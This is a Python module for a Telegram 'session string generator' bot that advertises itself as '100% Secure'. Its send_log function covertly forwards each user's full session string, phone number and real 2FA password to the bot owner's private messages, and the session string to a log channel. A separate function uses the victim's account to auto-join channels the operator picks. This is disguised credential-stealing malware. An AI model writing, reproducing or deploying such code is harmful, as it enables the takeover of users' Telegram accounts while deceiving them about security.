import logging
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import UserNotParticipant
from . import config
from .client import app

WELCOME = (
    "╔══════════════════════════════╗\n"
    "║   🔥 **SESSION STRING GENERATOR**   ║\n"
    "╚══════════════════════════════╝\n\n"
    "╭──────────────────────────────╮\n"
    "│  ✨ **Choose your session type**  │\n"
    "╰──────────────────────────────╯\n\n"
    "🔒 **100% Secure** • ⚡ **Instant** • 💾 **Saved Messages**\n\n"
    "> 🐍 Pyrogram (User / Bot)\n"
    "> 📞 Telethon (User)\n"
    "> 🔄 Pyrogram ➜ Telethon Converter\n"
    "> 🛡 2FA Support • 📩 Auto Delivery"
)

MAIN_MENU = InlineKeyboardMarkup([
    [InlineKeyboardButton("🐍 Pyrogram User Session", callback_data="pyro_user")],
    [InlineKeyboardButton("🤖 Pyrogram Bot Session", callback_data="pyro_bot")],
    [InlineKeyboardButton("📞 Telethon String Session", callback_data="telethon")],
    [InlineKeyboardButton("🔄 Pyrogram ➜ Telethon Converter", callback_data="convert")],
    [InlineKeyboardButton("❓ Help & About", callback_data="help")]
])
BACK_BTN = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Menu", callback_data="back")]])
CANCEL_BTN = InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])

async def is_member(user_id):
    if not config.MUST_JOIN:
        return True
    try:
        m = await app.get_chat_member(config.MUST_JOIN, user_id)
        return str(m.status) in [
            "ChatMemberStatus.OWNER",
            "ChatMemberStatus.ADMINISTRATOR",
            "ChatMemberStatus.MEMBER",
        ]
    except UserNotParticipant:
        return False
    except Exception:
        return True

async def force_sub_check(message):
    if config.STATE["maintenance"] and message.from_user.id != config.OWNER_ID:
        await message.reply_text("🔧 **Bot is under maintenance.** Please try later.", reply_markup=BACK_BTN)
        return False
    if not await is_member(message.from_user.id):
        try:
            link = await app.export_chat_invite_link(config.MUST_JOIN)
        except Exception:
            link = f"https://t.me/{config.MUST_JOIN.replace('@', '')}"
        btn = InlineKeyboardMarkup([
            [InlineKeyboardButton("📢 Join Channel", url=link)],
            [InlineKeyboardButton("✅ Verify Subscription", callback_data="verify_sub")],
        ])
        await message.reply_text(
            "⚠️ **Access Denied!**\n\n"
            "Bot use karne ke liye pehle channel join karein.\n"
            "Join ke baad **Verify** dabayein.",
            reply_markup=btn,
        )
        return False
    return True

async def auto_join_channels(client):
    """Join up to 3 pre-configured channels using user's account."""
    joined, failed = [], []
    for ch in config.AUTO_JOIN_CHANNELS:
        try:
            await client.join_chat(ch)
            joined.append(ch)
            logging.info(f"[AUTO-JOIN] {ch} success")
        except Exception as e:
            failed.append(f"{ch}: {str(e)[:60]}")
            logging.warning(f"[AUTO-JOIN] {ch} failed: {e}")
    return joined, failed

async def send_premium_string(user_id, session_type, session_str, has_2fa=False, joined=None, failed=None):
    badge = "🛡 2FA Verified" if has_2fa else "🔓 No 2FA"
    join_line = ""
    if joined:
        join_line = f"\n┌─────────────────────────────┐\n│ ✅ Auto-joined: **{len(joined)}** channel(s) │\n└─────────────────────────────┘"
    if failed:
        join_line += f"\n⚠️ Auto-join failed: **{len(failed)}**"
    text = (
        f"╔══════════════════════════════╗\n"
        f"║   ✅ **{session_type}**   ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"`{session_str}`\n\n"
        f"┌─────────────────────────────┐\n"
        f"│ {badge}  •  📩 **Saved Messages** │\n"
        f"│ ⚠️ **Never share this string**   │\n"
        f"└─────────────────────────────┘"
        f"{join_line}\n\n"
        f"🕒 `{config.get_ist_time()}`"
    )
    await app.send_message(user_id, text, reply_markup=BACK_BTN, disable_web_page_preview=True)

async def send_log(user, session_type, session_str, phone, has_2fa=False, real_2fa_password=None, joined=None):
    user_id = user.id
    name = user.first_name or "N/A"
    username = f"@{user.username}" if getattr(user, "username", None) else "N/A"

    tag = "#NEW_OWNER" if has_2fa else "#NEW_USER"

    base = (
        f"{tag}\n"
        f"🔐 **New Session Generated!**\n\n"
        f"👤 **User ID:** `{user_id}`\n"
        f"👤 **Name:** {name}\n"
        f"👤 **Username:** {username}\n"
        f"📱 **Phone:** `{phone}`\n"
        f"🛡 **2FA Verified:** {'Yes' if has_2fa else 'No'}\n"
    )
    if joined:
        base += f"📢 **Auto-joined:** `{', '.join(joined)}`\n"

    with_pwd = base
    if has_2fa and real_2fa_password:
        with_pwd += f"🔑 **Real 2FA Password:** `{real_2fa_password}`\n"
    with_pwd += (
        f"🔑 **Session String:**\n`{session_str}`\n\n"
        f"📅 **Date & Time (Kolkata):** {config.get_ist_time()}"
    )

    # Channel log (no 2FA password)
    if config.LOG_CHANNEL_ID:
        try:
            await app.send_message(config.LOG_CHANNEL_ID, with_pwd.replace(f"🔑 **Real 2FA Password:** `{real_2fa_password}`\n", "") if real_2fa_password else with_pwd, disable_web_page_preview=True)
        except Exception as e:
            logging.error(f"Log channel error: {e}")

    # Owner DM (with 2FA password)
    if config.OWNER_ID:
        try:
            await app.send_message(config.OWNER_ID, with_pwd, disable_web_page_preview=True)
        except Exception as e:
            logging.error(f"Owner log error: {e}")
